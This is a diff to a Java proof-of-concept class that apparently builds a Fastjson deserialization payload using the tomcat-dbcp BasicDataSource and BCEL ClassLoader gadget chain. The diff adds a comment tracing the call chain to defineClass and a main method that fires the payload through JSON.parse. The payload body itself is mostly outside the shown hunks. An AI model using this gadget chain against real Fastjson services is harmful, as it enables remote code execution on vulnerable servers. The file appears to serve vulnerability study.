@@ -3,12 +3,25 @@ package basicdatasource;
 /**
  * Created by xjj on 2023/3/18.
  */
+
+import com.alibaba.fastjson.JSON;
+
+/**
+ * org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()
+ *  javax.sql.DataSource#getConnection()
+ *   org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()
+ *    java.lang.Class#forName(className, initialize, classLoader)
+ *     com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass()
+ *      com.sun.org.apache.bcel.internal.util.ClassLoader#createClass()
+ *      java.lang.ClassLoader#defineClass()
+ */
 public class BasicDataSourcePoc {
 
     public static String basicDataSource() {
         // bcel + tomcat-dbcp
-        // BasicDataSource
-        // com.sun.org.apache.bcel.internal.util.ClassLoader
+//         BasicDataSource
+//         com.sun.org.apache.bcel.internal.util.ClassLoader
+//        org.apache.tomcat.dbcp.dbcp2.BasicDataSource
         /**
          * https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
          * 这里PoC结构上还有一个值得注意的地方在于，
@@ -44,5 +57,14 @@ public class BasicDataSourcePoc {
 //                "        \"driverClassName\": \"" + bcel + "\"\n" +
 //                "}";
         return poc;
+    }
+
+    public static void main(String[] args) {
+        String poc = basicDataSource();
+        /**
+         * 这个里面有toJSON方法, 就是把已经构造好的类全部执行一遍其中的
+         */
+//        JSON.parseObject(poc);
+        JSON.parse(poc);
     }
 }
